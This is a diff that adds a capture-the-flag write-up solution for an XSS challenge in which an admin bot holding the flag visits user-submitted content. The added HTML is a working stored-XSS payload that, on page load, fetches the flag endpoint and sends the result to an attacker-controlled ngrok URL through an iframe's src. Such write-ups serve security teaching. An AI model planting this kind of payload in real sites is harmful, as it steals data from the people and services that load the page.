@@ -7,8 +7,30 @@ Clam was intensely brainstorming new challenge ideas, when his stomach growled! 
 ---
 
 #### Solution:
+Cross site scripting - You can submit content that will be put in div and the bot that has access to the flag will visit the page. We create free public DNS
+to our machine and set up basic http server to see incoming request. Next we create payload that will run XMLHttpRequest to our local server.
 
-```bash
+
+```html
+<>"'
+<iframe id="if" src=""></iframe>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+/* MY PUBLIC IP */
+const PUBLIC_IP = "https://3aba-178-40-212-78.eu.ngrok.io/test?flag=" 
+let xhr = new XMLHttpRequest();
+xhr.open("get", "https://xtra-salty-sardines.web.actf.co/flag");
+xhr.send();
+xhr.onload = function () {
+    var flag = xhr.response;
+    document.getElementById("if").src = (PUBLIC_IP + flag );
+}
+
+    
+});
+
+</script>
+<h1>
 ```
 
 ---
